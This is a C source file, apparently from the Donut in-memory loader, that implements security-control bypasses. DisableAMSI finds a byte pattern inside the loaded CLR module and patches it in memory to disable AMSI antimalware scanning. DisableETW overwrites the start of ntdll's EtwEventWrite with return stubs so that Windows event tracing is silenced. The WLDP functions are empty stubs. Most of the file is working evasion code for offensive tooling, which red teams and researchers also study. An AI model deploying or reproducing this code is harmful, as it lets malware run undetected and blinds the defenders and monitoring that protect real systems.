#include "bypass.h"


//
// AMSI bypass
//


#if defined(BYPASS_AMSI_A)

BOOL IsReadablePage(DWORD protect)
{
    if (protect & PAGE_GUARD)
        return FALSE;

    if (protect & PAGE_NOACCESS)
        return FALSE;

    DWORD baseProtect = protect & 0xff;

    switch (baseProtect)
    {
    case PAGE_READONLY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
    case PAGE_EXECUTE_READ:
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
        return TRUE;

    default:
        return FALSE;
    }
}

static BYTE* FindBytes(BYTE* start, SIZE_T size, const char* pattern)
{
    SIZE_T pattern_size;
    SIZE_T offset;
    SIZE_T i;

    if (start == NULL || size == 0 || pattern == NULL || pattern[0] == '\0')
        return NULL;

    pattern_size = 0;
    while (pattern[pattern_size] != '\0')
        pattern_size++;

    if (pattern_size > size)
        return NULL;

    for (offset = 0; offset <= size - pattern_size; offset++)
    {
        i = 0;

        while (i < pattern_size &&
               start[offset + i] == (BYTE)pattern[i])
        {
            i++;
        }

        if (i == pattern_size)
            return start + offset;
    }

    return NULL;
}

BOOL DisableAMSI(PDONUT_INSTANCE inst) 
{
    LPVOID clr;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    BYTE* moduleStart;
    SIZE_T moduleSize;
    BYTE* moduleEnd;
    BYTE* current;
    MEMORY_BASIC_INFORMATION mbi;
    BYTE* regionBase;
    BYTE* regionEnd;
    BYTE* scanStart;
    SIZE_T scanSize;
    BYTE* found = NULL;
    DWORD op, t;

    
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) 
      return FALSE;
    
    DPRINT("GetModuleHandleA %p", clr);

    dos = (PIMAGE_DOS_HEADER)clr;  
    nt = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  

    moduleStart = (BYTE*)clr;
    moduleSize = nt->OptionalHeader.SizeOfImage;
    moduleEnd = moduleStart + moduleSize;
    current = moduleStart;

    while (current < moduleEnd)
    {
        if (!inst->api.VirtualQuery((LPVOID)current, &mbi, sizeof(mbi)))
            break;

        regionBase = (BYTE*)mbi.BaseAddress;
        regionEnd  = regionBase + mbi.RegionSize;

        if (regionEnd > moduleEnd)
            regionEnd = moduleEnd;

        scanStart = current;

        if (scanStart < regionBase)
            scanStart = regionBase;

        if (
            mbi.State == MEM_COMMIT &&
            IsReadablePage(mbi.Protect) &&
            scanStart < regionEnd
        )
        {
            scanSize = regionEnd - scanStart;

            found = FindBytes(scanStart, scanSize, inst->amsiScanBuf);

            DPRINT("FindBytes %p", found);

            if (found)
                break;
        }

        current = regionEnd;
    }

    if (found)
    {
      if (!inst->api.VirtualProtect(found, 4, PAGE_EXECUTE_READWRITE, &op)) 
        return FALSE;
      Memcpy(found, inst->amsiScanBuf+1, 4);
      inst->api.VirtualProtect(found, 4, op, &t);
      return TRUE;
    }

  return FALSE;
}

#elif defined(BYPASS_AMSI_B)

BOOL DisableAMSI(PDONUT_INSTANCE inst) 
{    
  return FALSE;
}

#endif


//
// WLDP bypass
//


#if defined(BYPASS_WLDP_A)

BOOL DisableWLDP(PDONUT_INSTANCE inst) 
{
    return TRUE;
}

#elif defined(BYPASS_WLDP_B)

BOOL DisableWLDP(PDONUT_INSTANCE inst) 
{
    return TRUE;
}
#endif


//
// ETW bypass
//


#if defined(BYPASS_ETW_A)

BOOL DisableETW(PDONUT_INSTANCE inst) 
{
    HMODULE ntdll;
    DWORD   len, op, t;
    LPVOID  pEventWrite ;

    ntdll = xGetLibAddress(inst, inst->ntdll);
    pEventWrite  = xGetProcAddress(inst, ntdll, inst->etwEventWrite, 0);
    if (pEventWrite  == NULL) 
      return FALSE;

    if (!inst->api.VirtualProtect(pEventWrite, 1024, PAGE_EXECUTE_READWRITE, &op)) 
        return FALSE;

#if defined(_M_ARM64) || defined(__aarch64__)
    Memcpy(pEventWrite, inst->etwRetArm, 8);
#elif defined(_WIN64)
    Memcpy(pEventWrite, inst->etwRet64, 4);
#else
    Memcpy(pEventWrite, inst->etwRet32, 5);
#endif

    inst->api.VirtualProtect(pEventWrite, 1024, op, &t);


    return TRUE;
}

#elif defined(BYPASS_ETW_B)

BOOL DisableETW(PDONUT_INSTANCE inst) 
{
    return TRUE;
}

#endif